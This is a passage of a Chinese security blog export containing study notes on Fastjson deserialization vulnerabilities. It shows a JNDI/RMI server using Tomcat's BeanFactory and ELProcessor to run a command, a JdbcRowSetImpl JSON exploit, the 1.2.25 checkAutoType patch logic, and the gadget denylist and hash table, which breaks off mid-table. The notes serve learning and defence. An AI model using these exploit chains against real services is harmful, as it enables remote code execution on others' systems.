<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIserver</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"><span class="comment">//        initialContext.rebind(&quot;rmi://localhost:1099/remoteobject&quot;, new remoteObject());  </span></span><br><span class="line"><span class="comment">//        Reference reference = new Reference(&quot;TestRef&quot;,&quot;TestRef&quot;,&quot;http://localhost:7777/&quot;);  </span></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>,<span class="string">&quot;x=eval&quot;</span>));  </span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/RO&quot;</span>, resourceRef);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/RO\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(json);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>踩坑点：记得加依赖呃呃呃，浪费点时间，把依赖的事忘了。<br><img src="/posts/422832ee/20260123202923508.png" alt="image.png"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#0x05-Fastjson-%E6%94%BB%E5%87%BB%E4%B8%AD-jdk-%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E7%BB%95%E8%BF%87">Java反序列化Fastjson篇02-Fastjson-1.2.24版本漏洞分析 | Drunkbaby’s Blog</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Fastjson</category>
      </categories>
  </entry>
  <entry>
    <title>fastjson3</title>
    <url>/posts/352f0278/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>还是跟着Drunkbaby大佬的博客继续学习，这篇是fastjson各版本的绕过，绕过的利用都必须开启AutoTypeSupport才能成功。接着上篇的1.2.24，我们从1.2.25开始。</p>
<h1 id="fastjson1-2-25如何修复的"><a href="#fastjson1-2-25如何修复的" class="headerlink" title="fastjson1.2.25如何修复的"></a>fastjson1.2.25如何修复的</h1><p>先添加一下依赖包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;1.2.25&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>这里我们先看一下1.2.24与1.2.25之间的关键区别点<br>首先是1.2.24DefaultJSONParser.parserObject方法<br><img src="/posts/352f0278/20260125145521405.png" alt="image.png"><br>这里有个加载类的方法的调用。作用就是找@type指向的类，并进行加载，类似于Class.forName<br>但是在1.2.25版本的时候，这里改成了checkAutoType<br><img src="/posts/352f0278/20260125145814400.png" alt="image.png"><br>具体看一下checkAutoType方法的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>); </span><br><span class="line">     </span><br><span class="line">  <span class="comment">//autoTypeSupport默认是false</span></span><br><span class="line">  <span class="comment">/*在autoTypeSupport开启之后会对类先做一个白名单的过滤，若匹配成功就会进行类的加载，若不成功就会进行黑名单的过滤*/</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;  </span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  <span class="comment">// 从Map缓存中获取类，注意这是后面版本的漏洞点</span></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);  </span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;  </span><br><span class="line">        clazz = deserializers.findClass(typeName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125;  </span><br><span class="line">  <span class="comment">/*如果autoTypeSupport没有开启，则会进行一个黑名单的过滤，若没有匹配成功就会进行百名单的过滤，如果匹配成功则进行类的加载*/</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;  </span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger  </span></span><br><span class="line">                || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver  </span></span><br><span class="line">                ) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> clazz;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>autoTypeSupport默认是false，acceptList是白名单（默认为空，可以手动添加），denyList是黑名单（默认是不为空的）。<br>在autoTypeSupport为默认false时，会先对@type指向的类进行黑名单的判断，结果如果匹配成功就会抛出错误，停止运行，如果没有匹配成功就会正常运行。<br>黑名单的内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>
<p>可以看到黑名单中是有<code>com.sun</code>的，我们在1.2.24的利用链中提到了两个利用链，一个是TemplatesImpl链和JdbcRowSetImpl链两者都要用到<code>com.sun</code>,所以现在两条链都不能继续使用了。<br><img src="/posts/352f0278/20260126134957609.png" alt="image.png"><br><img src="/posts/352f0278/20260126135009137.png" alt="image.png"></p>
<h2 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h2><p>autoTypeSupport是<code>checkAutoType()</code>函数出现后ParserConfig.java中新增的一个配置选项，在<code>checkAutoType()</code>函数的某些代码逻辑起到开关的作用。<br>默认情况下是false，将其设置为true的方法是：</p>
<ol>
<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li>
<li>代码中设置<code>Parserconfig.getGlobalInstance().setAutoTypeSupport(true);</code> 如果使用非全局，parserConfig则要另外调用<code>setAutoTypeSupport(true)</code><br>AutoType白名单的设置方法：</li>
</ol>
<ul>
<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li>
<li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li>
<li>通过fastjson.properties文件配置。在1.2.25&#x2F;1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li>
</ul>
<h1 id="寻找利用链"><a href="#寻找利用链" class="headerlink" title="寻找利用链"></a>寻找利用链</h1><p>在1.2.42版本之后，为了增加安全性，将黑名单中的明文形式转换成了密文形式（哈希），但是大部分黑名单已经被人跑出来了。<a href="https://github.com/LeadroyaL/fastjson-blacklist">LeadroyaL&#x2F;fastjson-blacklist</a></p>
<h2 id="目前的列表"><a href="#目前的列表" class="headerlink" title="目前的列表"></a>目前的列表</h2><table>
<thead>
<tr>
<th>version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>1.2.42</td>
<td>-8720046426850100497</td>
<td>0x86fc2bf9beaf7aefL</td>
<td>org.apache.commons.collections4.comparators</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-8109300701639721088</td>
<td>0x8f75f9fa0df03f80L</td>
<td>org.python.core</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-7966123100503199569</td>
<td>0x9172a53f157930afL</td>
<td>org.apache.tomcat</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-7766605818834748097</td>
<td>0x9437792831df7d3fL</td>
<td>org.apache.xalan</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-6835437086156813536</td>
<td>0xa123a62f93178b20L</td>
<td>javax.xml</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-4837536971810737970</td>
<td>0xbcdd9dc12766f0ceL</td>
<td>org.springframework.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-4082057040235125754</td>
<td>0xc7599ebfe3e72406L</td>
<td>org.apache.commons.beanutils</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-2364987994247679115</td>
<td>0xdf2ddff310cdb375L</td>
<td>org.apache.commons.collections.Transformer</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-1872417015366588117</td>
<td>0xe603d6a51fad692bL</td>
<td>org.codehaus.groovy.runtime</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-254670111376247151</td>
<td>0xfc773ae20c827691L</td>
<td>java.lang.Thread</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-190281065685395680</td>
<td>0xfd5bfc610056d720L</td>
<td>javax.net.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>313864100207897507</td>
<td>0x45b11bc78a3aba3L</td>
<td>com.mchange</td>
</tr>
<tr>
<td>1.2.42</td>
<td>1203232727967308606</td>
<td>0x10b2bdca849d9b3eL</td>
<td>org.apache.wicket.util</td>
</tr>
<tr>
<td>1.2.42</td>
<td>1502845958873959152</td>
<td>0x14db2e6fead04af0L</td>
<td>java.util.jar.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>3547627781654598988</td>
<td>0x313bb4abd8d4554cL</td>
<td>org.mozilla.javascript</td>
</tr>
<tr>
<td>1.2.42</td>
<td>3730752432285826863</td>
<td>0x33c64b921f523f2fL</td>
<td>java.rmi</td>
</tr>
<tr>
<td>1.2.42</td>
<td>3794316665763266033</td>
<td>0x34a81ee78429fdf1L</td>
<td>java.util.prefs.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>4147696707147271408</td>
<td>0x398f942e01920cf0L</td>
<td>com.sun.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5347909877633654828</td>
<td>0x4a3797b30328202cL</td>
<td>java.util.logging.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5450448828334921485</td>
<td>0x4ba3e254e758d70dL</td>
<td>org.apache.bcel</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5751393439502795295</td>
<td>0x4fd10ddc6d13821fL</td>
<td>java.net.Socket</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5944107969236155580</td>
<td>0x527db6b46ce3bcbcL</td>
<td>org.apache.commons.fileupload</td>
</tr>
<tr>
<td>1.2.42</td>
<td>6742705432718011780</td>
<td>0x5d92e6ddde40ed84L</td>
<td>org.jboss</td>
</tr>
<tr>
<td>1.2.42</td>
<td>7179336928365889465</td>
<td>0x63a220e60a17c7b9L</td>
<td>org.hibernate</td>
</tr>
<tr>
<td>1.2.42</td>
<td>7442624256860549330</td>
<td>0x6749835432e0f0d2L</td>
<td>org.apache.commons.collections.functors</td>
</tr>
<tr>
<td>1.2.42</td>
<td>8838294710098435315</td>
<td>0x7aa7ee3627a19cf3L</td>
<td>org.apache.myfaces.context.servlet</td>
</tr>
<tr>
<td>1.2.43</td>
<td>-2262244760619952081</td>
<td>0xe09ae4604842582fL</td>
<td>java.net.URL</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-8165637398350707645</td>
<td>0x8eadd40cb2a94443L</td>
<td>junit.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-8083514888460375884</td>
<td>0x8fd1960988bce8b4L</td>
<td>org.apache.ibatis.datasource</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-7921218830998286408</td>
<td>0x92122d710e364fb8L</td>
<td>org.osjava.sj.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-7768608037458185275</td>
<td>0x94305c26580f73c5L</td>
<td>org.apache.log4j.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-6179589609550493385</td>
<td>0xaa3daffdb10c4937L</td>
<td>org.logicalcobwebs.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-5194641081268104286</td>
<td>0xb7e8ed757f5d13a2L</td>
<td>org.apache.logging.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-3935185854875733362</td>
<td>0xc963695082fd728eL</td>
<td>org.apache.commons.dbcp</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-2753427844400776271</td>
<td>0xd9c9dbf6bbd27bb1L</td>
<td>com.ibatis.sqlmap.engine.datasource</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-1589194880214235129</td>
<td>0xe9f20bad25f60807L</td>
<td>org.jdom.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>1073634739308289776</td>
<td>0xee6511b66fd5ef0L</td>
<td>org.slf4j.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>5688200883751798389</td>
<td>0x4ef08c90ff16c675L</td>
<td>javassist.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>7017492163108594270</td>
<td>0x616323f12c2ce25eL</td>
<td>oracle.net</td>
</tr>
<tr>
<td>1.2.46</td>
<td>8389032537095247355</td>
<td>0x746bd4a53ec195fbL</td>
<td>org.jaxen.</td>
</tr>
<tr>
<td>1.2.48</td>
<td>1459860845934817624</td>
<td>0x144277b467723158L</td>
<td>java.net.InetAddress</td>
</tr>
<tr>
<td>1.2.48</td>
<td>8409640769019589119</td>
<td>0x74b50bb9260e31ffL</td>
<td>java.lang.Class</td>
</tr>
<tr>
<td>1.2.49</td>
<td>4904007817188630457</td>
<td>0x440e89208f445fb9L</td>
<td>com.alibaba.fastjson.annotation</td>
</tr>
<tr>
<td>1.2.59</td>
<td>5100336081510080343</td>
<td>0x46c808a4b5841f57L</td>
<td>org.apache.cxf.jaxrs.provider.</td>
</tr>
<tr>
<td>1.2.59</td>
<td>6456855723474196908</td>
<td>0x599b5c1213a099acL</td>
<td>ch.qos.logback.</td>
</tr>
<tr>
<td>1.2.59</td>
<td>8537233257283452655</td>
<td>0x767a586a5107feefL</td>
<td>net.sf.ehcache.transaction.manager.</td>
</tr>
<tr>
<td>1.2.60</td>
<td>3688179072722109200</td>
<td>0x332f0b5369a18310L</td>
<td>com.zaxxer.hikari.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-4401390804044377335</td>
<td>0xc2eb1e621f439309L</td>
<td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-1650485814983027158</td>
<td>0xe9184be55b1d962aL</td>
<td>org.apache.openjpa.ee.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-1251419154176620831</td>
<td>0xeea210e8da2ec6e1L</td>
<td>oracle.jdbc.rowset.OracleJDBCRowSet</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-9822483067882491</td>
<td>0xffdd1a80f1ed3405L</td>
<td>com.mysql.cj.jdbc.admin.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>99147092142056280</td>
<td>0x1603dc147a3e358L</td>
<td>oracle.jdbc.connector.OracleManagedConnectionFactory</td>
</tr>
<tr>
<td>1.2.61</td>
<td>3114862868117605599</td>
<td>0x2b3a37467a344cdfL</td>
<td>org.apache.ibatis.parsing.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>4814658433570175913</td>
<td>0x42d11a560fc9fba9L</td>
<td>org.apache.axis2.jaxws.spi.handler.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>6511035576063254270</td>
<td>0x5a5bd85c072e5efeL</td>
<td>jodd.db.connection.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>8925522461579647174</td>
<td>0x7bddd363ad3998c6L</td>
<td>org.apache.commons.configuration.JNDIConfiguration</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-9164606388214699518</td>
<td>0x80d0c70bcc2fea02L</td>
<td>org.apache.ibatis.executor.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-8649961213709896794</td>
<td>0x87f52a1b07ea33a6L</td>
<td>net.sf.cglib.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-6316154655839304624</td>
<td>0xa85882ce1044c450L</td>
<td>oracle.net.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-5764804792063216819</td>
<td>0xafff4c95b99a334dL</td>
<td>com.mysql.cj.jdbc.MysqlDataSource</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-4608341446948126581</td>
<td>0xc00be1debaf2808bL</td>
<td>jdk.internal.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-4438775680185074100</td>
<td>0xc2664d0958ecfe4cL</td>
<td>aj.org.objectweb.asm.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-3319207949486691020</td>
<td>0xd1efcdf4b3316d34L</td>
<td>oracle.jdbc.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-2192804397019347313</td>
<td>0xe1919804d5bf468fL</td>
<td>org.apache.commons.collections.comparators.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-2095516571388852610</td>
<td>0xe2eb3ac7e56c467eL</td>
<td>net.sf.ehcache.hibernate.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>4750336058574309</td>
<td>0x10e067cd55c5e5L</td>
<td>com.mysql.cj.log.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>218512992947536312</td>
<td>0x3085068cb7201b8L</td>
<td>org.h2.jdbcx.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>823641066473609950</td>
<td>0xb6e292fa5955adeL</td>
<td>org.apache.commons.logging.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>1534439610567445754</td>
<td>0x154b6cb22d294cfaL</td>
<td>org.apache.ibatis.reflection.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>1818089308493370394</td>
<td>0x193b2697eaaed41aL</td>
<td>org.h2.server.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>2164696723069287854</td>
<td>0x1e0a8c3358ff3daeL</td>
<td>org.apache.ibatis.datasource.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>2653453629929770569</td>
<td>0x24d2f6048fef4e49L</td>
<td>org.objectweb.asm.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>2836431254737891113</td>
<td>0x275d0732b877af29L</td>
<td>flex.messaging.util.concurrent.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>3089451460101527857</td>
<td>0x2adfefbbfe29d931L</td>
<td>org.apache.ibatis.javassist.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>3256258368248066264</td>
<td>0x2d308dbbc851b0d8L</td>
<td>java.lang.UNIXProcess</td>
</tr>
<tr>
<td>1.2.62</td>
<td>3718352661124136681</td>
<td>0x339a3e0b6beebee9L</td>
<td>org.apache.ibatis.ognl.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>4046190361520671643</td>
<td>0x3826f4b2380c8b9bL</td>
<td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td>
</tr>
<tr>
<td>1.2.62</td>
<td>4841947709850912914</td>
<td>0x43320dc9d2ae0892L</td>
<td>org.codehaus.jackson.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>6280357960959217660</td>
<td>0x5728504a6d454ffcL</td>
<td>org.apache.ibatis.scripting.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>6534946468240507089</td>
<td>0x5ab0cb3071ab40d1L</td>
<td>org.apache.commons.proxy.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>6734240326434096246</td>
<td>0x5d74d3e5b9370476L</td>
<td>com.mysql.cj.jdbc.MysqlXADataSource</td>
</tr>
<tr>
<td>1.2.62</td>
<td>7123326897294507060</td>
<td>0x62db241274397c34L</td>
<td>org.apache.commons.collections.functors.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>8488266005336625107</td>
<td>0x75cc60f5871d0fd3L</td>
<td>org.apache.commons.configuration</td>
</tr>
<tr>
<td>1.2.66</td>
<td>-2439930098895578154</td>
<td>0xde23a0809a8b9bd6L</td>
<td>javax.script.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>-582813228520337988</td>
<td>0xf7e96e74dfa58dbcL</td>
<td>javax.sound.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>-26639035867733124</td>
<td>0xffa15bf021f1e37cL</td>
<td>javax.print.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>386461436234701831</td>
<td>0x55cfca0f2281c07L</td>
<td>javax.activation.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>1153291637701043748</td>
<td>0x100150a253996624L</td>
<td>javax.tools.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>1698504441317515818L</td>
<td>0x17924cca5227622aL</td>
<td>javax.management.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>7375862386996623731L</td>
<td>0x665c53c311193973L</td>
<td>org.apache.xbean.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>7658177784286215602L</td>
<td>0x6a47501ebb2afdb2L</td>
<td>org.eclipse.jetty.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>8055461369741094911L</td>
<td>0x6fcabf6fa54cafffL</td>
<td>javax.naming.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-7775351613326101303L</td>
<td>0x941866e73beff4c9L</td>
<td>org.apache.shiro.realm.</td>
</tr>
<tr>
<td>1.2.67</td>
